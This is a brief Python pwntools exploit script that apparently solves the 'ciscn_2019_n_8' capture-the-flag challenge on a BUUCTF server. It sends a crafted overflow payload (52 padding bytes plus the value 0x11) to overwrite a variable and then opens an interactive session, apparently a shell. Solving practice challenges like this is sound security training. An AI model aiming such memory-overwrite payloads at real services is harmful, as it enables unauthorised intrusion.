from pwn import *
context.log_level = 'debug'
conn = remote(b'node4.buuoj.cn', 27578)

#conn = process('./ciscn_2019_n_8')
#gdb.attach(conn, 'b scanf')
conn.recvuntil(b"What's your name?\n")

payload = b'a' * 52 + b'\x11\x00\x00\x00' + b'\x00\x00\x00\x00'
conn.sendline(payload)
#conn.recv()
conn.interactive()
